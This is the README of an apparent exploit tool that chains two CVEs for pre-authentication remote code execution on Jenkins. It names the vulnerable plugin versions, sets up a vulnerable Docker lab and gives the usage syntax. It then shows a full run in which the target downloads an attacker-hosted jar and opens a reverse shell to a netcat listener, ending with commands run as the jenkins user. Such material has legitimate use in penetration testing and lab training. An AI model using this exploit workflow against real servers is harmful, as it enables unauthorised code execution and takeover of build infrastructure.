# jenkins_preauth_rce

## Summary

Description : This exploit chains CVE-2019-1003000 and CVE-2018-1999002 for Pre-Auth Remote Code Execution in Jenkins
Security Advisory : https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266

**Vulnerable Plugins**

Pipeline: Declarative Plugin up to and including 1.3.4
Pipeline: Groovy Plugin up to and including 2.61
Script Security Plugin up to and including 1.49

**Resources**

https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html \
https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861 \
https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC \
https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266

Here is the exploit code for exploit this issue.

## Usage

Start docker container with Jenins if you want to test this locally

```ssh
⬢  jenkins_preauth_rce  master ⦿ docker-compose up -d
Creating network "jenkinspreauthrce_default" with the default driver
Creating jenkinspreauthrce_jenkins_1 ... done
```

Verify that container is running.

```ssh
⬢  jenkins_preauth_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS                                              NAMES
cdd5256e8065        vulhub/jenkins:2.138   "/sbin/tini -- /usr/…"   29 seconds ago      Up 27 seconds       0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp   jenkinspreauthrce_jenkins_1
```

Run ./jenkins_preauth_rce.py to get the usage menu.

```ssh
⬢  jenkins_preauth_rce  master ⦿ ./jenkins_preauth_rce.py

 ▐▄▄▄▄▄▄ . ▐ ▄ ▄ •▄ ▪   ▐ ▄ .▄▄ ·  ▄▄▄·▄▄▄  ▄▄▄ . ▄▄▄· ▄• ▄▌▄▄▄▄▄ ▄ .▄▄▄▄   ▄▄· ▄▄▄ .
  ·██▀▄.▀·•█▌▐██▌▄▌▪██ •█▌▐█▐█ ▀. ▐█ ▄█▀▄ █·▀▄.▀·▐█ ▀█ █▪██▌•██  ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐▀▀▪▄▐█▐▐▌▐▀▀▄·▐█·▐█▐▐▌▄▀▀▀█▄ ██▀·▐▀▀▄ ▐▀▀▪▄▄█▀▀█ █▌▐█▌ ▐█.▪██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▄▄▌██▐█▌▐█.█▌▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐█•█▌▐█▄▄▌▐█ ▪▐▌▐█▄█▌ ▐█▌·██▌▐▀▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀▀▀ ▀▀ █▪·▀  ▀▀▀▀▀▀ █▪ ▀▀▀▀ .▀   .▀  ▀ ▀▀▀  ▀  ▀  ▀▀▀  ▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀
[mikael.kall@kindredgroup.com]

Usage: ./jenkins_preauth_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./jenkins_preauth_rce.py 'http://10.10.10.70' 10.10.14.24 1337
```

Run the exploit

```ssh
⬢  jenkins_preauth_rce  master ⦿ ./jenkins_preauth_rce.py 'http://127.0.0.1:8080' 10.100.xx.xx 1337
[+] LHOST = 10.100.xx.xx
[+] LPORT = 1337
[+] Generating payload
[+] HTTP Listen = 8000
[+] Netcat = 1337
[+] Exploit
192.168.144.2 - - [16/Apr/2019 13:47:45] code 404, message File not found
192.168.144.2 - - [16/Apr/2019 13:47:45] "HEAD /package/kCDcOLmx/1/kCDcOLmx-1.pom HTTP/1.1" 404 -
192.168.144.2 - - [16/Apr/2019 13:47:45] "HEAD /package/kCDcOLmx/1/kCDcOLmx-1.jar HTTP/1.1" 200 -
192.168.144.2 - - [16/Apr/2019 13:47:45] "GET /package/kCDcOLmx/1/kCDcOLmx-1.jar HTTP/1.1" 200 -
Connection from 192.168.144.2:47880
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@cdd5256e8065:/$ id
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
``

